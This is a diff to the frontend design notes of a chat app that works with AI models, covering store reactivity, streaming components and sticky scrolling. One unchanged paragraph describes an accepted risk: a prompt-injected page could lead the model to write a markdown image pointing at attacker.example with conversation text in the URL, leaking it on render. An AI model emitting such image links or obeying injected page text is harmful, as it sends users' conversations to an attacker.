@@ -12,7 +12,7 @@ frontend/
     chat/              # the chat page (SME-57)
       mod.rs           # Chat, ChatPanel (its effects, actions and event stream)
       sidebar.rs       # ConversationSidebar
-      transcript.rs    # Transcript, render_block_element and the tool/diff/notice helpers
+      transcript.rs    # Transcript, MessageView, render_block_element and the tool/diff/notice helpers
       context.rs       # ContextUsage: the usage bar and its detail dialog
       composer.rs      # Composer (the message box), EXAMPLE_ASKS
       repo_attach.rs   # RepoAttach ("Work on a repo")
@@ -20,8 +20,8 @@ frontend/
       question_card.rs # QuestionCard (the model's `ask_user` question)
       model_setup.rs   # ModelNotes (turn and notification errors)
       state.rs         # ConversationState (the store), apply_event, and the merges onto them
-      sticky.rs        # stick-to-bottom and pointer-hold scrolling helpers
-      streaming.rs     # format_elapsed (the working line)
+      sticky.rs        # use_sticky_bottom (StickyBottom) and the transcript's pointer-hold helpers
+      streaming.rs     # StreamingReply (the bubble), WorkingLine and format_elapsed
       panels/          # BrowsingPanel, TodoPanel, SandboxPanel
       tests.rs         # the page's unit tests
     git.rs             # GitSettingsPage
@@ -84,7 +84,7 @@ This isn't just style — a plain prop threaded down from `Home`/`ConversationRo
 
 **The open conversation's state is one store** (SME-57). `ConversationState` (`chat/state.rs`, `#[derive(Store)]`) holds everything the panel shows that belongs to the open conversation: its messages and load error, the streaming reply and turn state, todos, repos and the repo form, the sandbox panel, the browsing panel and its address bar, the context meter and its detail view, the waiting question, the errors that belong to it. On a switch, `ChatPanel` replaces it in one write (the default, with `conversation` set to the new id) before subscribing to the new conversation's events, so nothing can be missed the way per-signal resets were (SME-51 B11 was the context detail view staying open over the next conversation). **Effects rerun on a switch in no set order**, so one can run before the reset, with the fields still holding the previous conversation's: an effect that acts on a field for `selected` checks `conversation` first, as the browsing panel's frame subscription does (on SME-57 (b) it asked for frames for a conversation with no session). A new per-conversation field goes in the struct, and `test_conversation_state_starts_empty` won't compile until it's checked. What outlives a switch on purpose stays outside: the message box's draft, the turn errors (kept by conversation), the model picker, the time zone and the transcript's scroll bookkeeping.
 
-Components take the store (`state: Store<ConversationState>`) and read the fields they show through its lenses (`state.todos()`), so a write to one field re-renders only that field's readers: a streamed delta re-renders the transcript, not the panels. **The store lends out one write at a time:** two lenses' `write()` guards held at once panic at runtime (`AlreadyBorrowedMut`), even for different fields, since both borrow the one store. Change the sandbox pods and terminals together through `change_sandbox_panel`; anywhere else, take one guard at a time.
+Components take the store (`state: Store<ConversationState>`) and read the fields they show through its lenses (`state.todos()`), so a write to one field re-renders only that field's readers. **Keep what changes often in a component of its own** (SME-57 (c)): a streamed delta re-renders `StreamingReply` and the once-a-second tick `WorkingLine`, the only readers of `streaming_reply` and `turn_elapsed`; `Transcript` re-renders when the messages change, and each message is a keyed `MessageView` over memoized tool maps, so it re-renders only when its own message or a map changes. Browser scenario `streaming_into_a_long_transcript` holds this: streaming into 300 messages costs at most 3x the script time of streaming into one (it was 5.1x when every delta re-rendered the transcript). **The store lends out one write at a time:** two lenses' `write()` guards held at once panic at runtime (`AlreadyBorrowedMut`), even for different fields, since both borrow the one store. Change the sandbox pods and terminals together through `change_sandbox_panel`; anywhere else, take one guard at a time.
 
 The sidebar links to the other pages: "MCP servers", "Sandboxes" (`/pods`), "Sandbox volumes", "Git" and "Language servers". The route and code say pods; the link and the page's heading say "Sandboxes". The Sandboxes page (`pages/pods.rs`):
 - lists every live sandbox with its conversation, status, uptime, activity (busy, or idle for how long), memory and CPU use against their limits, and terminal count, plus a line under the row for its language servers, if any;
@@ -167,6 +167,8 @@ SME-30. The model's replies (assistant `Text` blocks, and the streaming bubble) 
 What it doesn't cover (accepted, user's decision 2026-09-27, confirmed 2026-10-03): **an image in a reply is fetched without a click.** A prompt-injected page could get the model to write `![](https://attacker.example/?q=<conversation text>)`, and the browser would send that URL when the reply renders. `no-referrer` keeps the page's own address out of the request; the URL itself still leaves. Links aren't followed until clicked.
 
 **Code blocks** (`CodeBlock`): a language label, a copy button (via `navigator.clipboard`; it says "Couldn't copy" if the browser refuses), and the code, highlighted by `crate::highlight` once its closing fence has arrived and its language is known (two-face's grammar set, loaded on first use: the first highlighted block on a page waits for it). Highlighting is classes only; colours live in `assets/highlight.css`, light and dark.
+
+**Following the bottom** (`chat/sticky.rs`). The transcript and each sandbox terminal follow their content's bottom while the user is at it, like `tail -f`, and leave them be once they scroll up to read. Each holds a `StickyBottom` from `use_sticky_bottom()`: its element (`mounted`, from `onmounted`) and whether the user is at the bottom (`scrolled`, from `onscroll`). An effect that follows new content checks `is_stuck()`, which doesn't subscribe: `onscroll` sets it on every scroll event, and an effect that reran on each one pulled a small scroll up back down (SME-83). Each terminal is a keyed `TerminalBody` with its own, following its own output, so its scroll state goes when the terminal does. The transcript's is `ChatPanel`'s `transcript_scroll`, and only the transcript holds the text under the pointer still through a layout change (SME-75: `pointer_over_transcript`, `layout_snap_pending`, the anchor scripts).
 
 **Sticky scroll.** An image grows its reply after the reply has rendered, so its `onload` calls `Markdown`'s `on_media_load`, which the transcript wires to the same layout-change path a side panel appearing takes (`media_loaded` in `ChatPanel`): re-snap to the bottom, or with the pointer over the transcript keep the text under it still (browser scenario `markdown_late_image`).
 
